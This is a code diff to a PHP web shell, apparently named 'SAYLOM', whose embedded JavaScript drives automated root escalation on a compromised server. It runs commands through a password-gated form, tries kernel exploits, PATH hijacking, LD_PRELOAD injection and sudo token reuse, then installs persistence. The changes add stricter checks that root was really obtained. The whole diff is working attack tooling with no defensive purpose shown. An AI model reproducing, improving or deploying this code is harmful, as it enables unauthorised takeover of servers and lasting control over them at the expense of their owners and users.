@@ -3310,7 +3310,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒜 𝑀 𝐵 𝒪 - 𝒢 𝐸 𝒯 𝐸 𝑅:: ~ 280326 2124</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 280326 2137</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
@@ -6182,27 +6182,35 @@ async function autoGetRoot() {
                 updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ EXECUTED', exploit.type, 'success');
                 log('[+] Exploit executed: ' + exploit.name, 'success');
                 
-                // IMMEDIATELY verify if root obtained
+                // IMMEDIATELY verify if root obtained - DOUBLE CHECK
                 const isRoot = await verifyRootAccess();
                 
                 if (isRoot) {
-                    rootObtained = true;
-                    log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
-                    log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
-                    
-                    // Update final success status
-                    statusDiv.innerHTML = `
-                        <div style="text-align:center;padding:10px;">
-                            <div style="font-size:24px;margin-bottom:10px;">🎉</div>
-                            <div style="color:#0f0;font-weight:bold;font-size:14px;">ROOT OBTAINED!</div>
-                            <div style="color:#888;font-size:11px;margin-top:5px;">${exploit.type.toUpperCase()} - ${exploit.name}</div>
-                            <div style="color:#6cf;font-size:10px;margin-top:5px;">Attempt ${attempts} of ${maxAttempts}</div>
-                        </div>
-                    `;
-                    break; // STOP - we got root!
+                    // Double verification to prevent false positive
+                    const doubleCheck = await verifyRootAccess();
+                    if (doubleCheck) {
+                        rootObtained = true;
+                        log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
+                        log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
+                        log('[+] ✅ Double verification passed!', 'success');
+                        
+                        // Update final success status
+                        statusDiv.innerHTML = `
+                            <div style="text-align:center;padding:10px;">
+                                <div style="font-size:24px;margin-bottom:10px;">🎉</div>
+                                <div style="color:#0f0;font-weight:bold;font-size:14px;">ROOT OBTAINED!</div>
+                                <div style="color:#888;font-size:11px;margin-top:5px;">${exploit.type.toUpperCase()} - ${exploit.name}</div>
+                                <div style="color:#6cf;font-size:10px;margin-top:5px;">Attempt ${attempts} of ${maxAttempts}</div>
+                            </div>
+                        `;
+                        break; // STOP - we got root!
+                    } else {
+                        log('[!] ⚠️ First check passed but double-check failed (inconsistent)', 'warn');
+                        updateExploitProgress(attempts, maxAttempts, exploit.name + ' ? INCONSISTENT', exploit.type, 'failed');
+                    }
                 } else {
                     updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ (no root yet)', exploit.type, 'failed');
-                    log('[!] Exploit ran but no root yet, continuing...', 'warn');
+                    log('[!] Exploit executed but no root yet, continuing...', 'warn');
                 }
             } else {
                 updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ FAILED', exploit.type, 'failed');
@@ -6329,24 +6337,30 @@ async function tryExploit(exploit) {
 // Helper: Quick root verification
 async function verifyRootAccess() {
     try {
-        const verifyForm = new FormData();
-        verifyForm.append('cmd', 'id && whoami');
-        verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
-        
-        const response = await fetch('', { method: 'POST', body: verifyForm });
-        const html = await response.text();
-        
-        // Multiple checks for root
-        const rootIndicators = [
-            'uid=0(root)',
-            'gid=0(root)',
-            'whoami\nroot',
-            'whoami:root',
-            '>root<',
-            'euid=0'
+        // Run verification 3 times to ensure consistency
+        let rootCount = 0;
+        const checks = [
+            'id',
+            'whoami',
+            'cat /proc/self/status | grep Uid'
         ];
         
-        return rootIndicators.some(indicator => html.includes(indicator));
+        for (const cmd of checks) {
+            const verifyForm = new FormData();
+            verifyForm.append('cmd', cmd);
+            verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            
+            const response = await fetch('', { method: 'POST', body: verifyForm });
+            const html = await response.text();
+            
+            // Strict checks - must match exactly
+            if (cmd === 'id' && html.includes('uid=0(root)')) rootCount++;
+            if (cmd === 'whoami' && html.includes('root') && !html.includes('u6')) rootCount++;
+            if (cmd.includes('Uid') && html.includes('Uid:\t0')) rootCount++;
+        }
+        
+        // Must pass at least 2 of 3 checks
+        return rootCount >= 2;
     } catch (e) {
         return false;
     }
@@ -6583,14 +6597,27 @@ async function kernelAutoCompile() {
             outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Exploit execution result:</span>\n';
             outputDiv.innerHTML += execHtml.substring(0, 2000);
             
-            if (execHtml.includes('uid=0(root)')) {
-                outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+            // Verify root with strict checks
+            const verifyForm = new FormData();
+            verifyForm.append('cmd', 'id');
+            verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+            const verifyResponse = await fetch('', { method: 'POST', body: verifyForm });
+            const verifyHtml = await verifyResponse.text();
+            
+            // Strict check: must contain exact string 'uid=0(root)'
+            const isReallyRoot = verifyHtml.includes('uid=0(root)');
+            
+            if (isReallyRoot) {
+                outputDiv.innerHTML += '\n\n<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED! (Verified)</span>\n';
+                outputDiv.innerHTML += '<span style="color:#0f0;">uid=0(root) confirmed</span>\n';
                 statusDiv.className = 'privesc-status success';
                 statusDiv.innerHTML = '✅ ROOT OBTAINED via ' + targetCve;
                 await installPersistenceWithLog();
             } else {
-                outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root - try manual execution</span>\n';
-                statusDiv.innerHTML = '⚠️ Exploit executed but no root';
+                outputDiv.innerHTML += '\n\n<span style="color:#f44;">[!] Exploit ran but no root access</span>\n';
+                outputDiv.innerHTML += '<span style="color:#888;">Current user: ' + verifyHtml.substring(0, 200) + '</span>\n';
+                outputDiv.innerHTML += '<span style="color:#ff0;">💡 Tips: Try running exploit manually or check if system is patched</span>\n';
+                statusDiv.innerHTML = '⚠️ Exploit executed but no root (False Positive)';
             }
         } else {
             outputDiv.innerHTML += '\n<span style="color:#f44;">❌ Auto-deploy failed:</span>\n' + data.output + '\n';
@@ -6635,8 +6662,18 @@ async function hijackPathAttack() {
                     const isRoot = await verifyRootAccess();
                     if (isRoot) {
                         outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                        outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
                         await installPersistenceWithLog();
                         return;
+                    } else {
+                        // Show actual user for debugging
+                        const verifyForm = new FormData();
+                        verifyForm.append('cmd', 'id');
+                        verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
+                        const verifyResp = await fetch('', { method: 'POST', body: verifyForm });
+                        const verifyHtml = await verifyResp.text();
+                        const uidMatch = verifyHtml.match(/uid=\d+\([^)]+\)/);
+                        outputDiv.innerHTML += '<span style="color:#f44;">[!] Still: ' + (uidMatch ? uidMatch[0] : 'not root') + '</span>\n';
                     }
                 }
             }
@@ -6677,7 +6714,10 @@ async function ldPreloadAttack() {
                 const isRoot = await verifyRootAccess();
                 if (isRoot) {
                     outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                    outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
                     await installPersistenceWithLog();
+                } else {
+                    outputDiv.innerHTML += '<span style="color:#f44;">[!] LD_PRELOAD injected but no root</span>\n';
                 }
             } else {
                 outputDiv.innerHTML += '<span style="color:#f44;">[!] Failed: ' + execData.output + '</span>\n';
@@ -6721,9 +6761,10 @@ async function sudoTokenAttack() {
             const isRoot = await verifyRootAccess();
             if (isRoot) {
                 outputDiv.innerHTML += '<span style="color:#0f0;font-size:14px;">🎉 ROOT OBTAINED!</span>\n';
+                outputDiv.innerHTML += '<span style="color:#0f0;">✅ Verified: uid=0(root)</span>\n';
                 await installPersistenceWithLog();
             } else {
-                outputDiv.innerHTML += '<span style="color:#f44;">[!] Token reuse failed (may have expired)</span>\n';
+                outputDiv.innerHTML += '<span style="color:#f44;">[!] Token reuse failed (may have expired or not root)</span>\n';
             }
         } else {
             outputDiv.innerHTML += '<span style="color:#f44;">❌ No active sudo tokens found</span>\n';
